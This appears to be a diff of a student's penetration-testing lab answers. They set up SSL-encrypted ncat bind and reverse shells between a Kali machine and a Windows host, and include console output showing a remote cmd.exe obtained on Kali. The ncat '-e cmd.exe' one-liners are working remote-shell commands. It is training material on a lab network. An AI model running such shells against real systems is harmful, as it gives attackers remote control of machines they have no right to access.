@@ -2,9 +2,40 @@ Exercises 2.2.1
 
 In preparation for these exercises, the firewall on the Windows host have been turned off.
 
-1.  a) In the Windows host launch cmd in the Tools\ncat folder
-    b) Enter command 'ncat -l 4444 --ssl -e cmd.exe'
-    c) from the Kali host connect with 'ncat 10.11.8.75 4444 --ssl'
-    d) now is cmd.exe available on the Kali host.
+1.  a) In the Kali host run command "ncat -vl 4444 --ssl"
+    b) In the Windows host launch cmd in the Tools\ncat folder
+    c) Run command 'ncat 10.11.0.107 4444 --ssl -e cmd.exe'
+    d) cmd.exe is now available on the Kali host.
 
-2.  
+2.  No it does not work, ssl connection refused:
+C:\Users\Administrator\Desktop\Tools\ncat>ncat -vl 4444 --ssl -e cmd.exe
+Ncat: Version 5.59BETA1 ( http://nmap.org/ncat )
+Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to u
+se a permanent one.
+Ncat: SHA-1 fingerprint: 5F1D C6FD 42C4 070A F5CB C0A6 D944 4DE3 D6CE DF5A
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.11.0.107:53266.
+Ncat: Failed SSL connection from 10.11.0.107: error:00000000:lib(0):func(0):reas
+on(0)
+
+3.  Yes it works (if the firewall is turned off on the Windows host) 
+    C:\Users\Administrator\Desktop\Tools\ncat>ncat -vl 4444 --ssl -e cmd.exe
+    Ncat: Version 5.59BETA1 ( http://nmap.org/ncat )
+    Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to u
+    se a permanent one.
+    Ncat: SHA-1 fingerprint: EAA6 36DC 61BE 1B90 EE8A F78A 390F DAEE 4407 CBEE
+    Ncat: Listening on 0.0.0.0:4444
+    Ncat: Connection from 10.11.0.107:53270.
+    
+
+    root@kali:~# ncat -vn 10.11.8.75 4444 --ssl
+    Ncat: Version 7.01 ( https://nmap.org/ncat )
+    Ncat: Subject: CN=localhost
+    Ncat: Issuer: CN=localhost
+    Ncat: SHA-1 fingerprint: EAA6 36DC 61BE 1B90 EE8A F78A 390F DAEE 4407 CBEE
+    Ncat: Certificate verification failed (self signed certificate).
+    Ncat: SSL connection to 10.11.8.75:4444.
+    Ncat: SHA-1 fingerprint: EAA6 36DC 61BE 1B90 EE8A F78A 390F DAEE 4407 CBEE
+    Microsoft Windows [Version 6.1.7601]
+    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+    C:\Users\Administrator\Desktop\Tools\ncat>
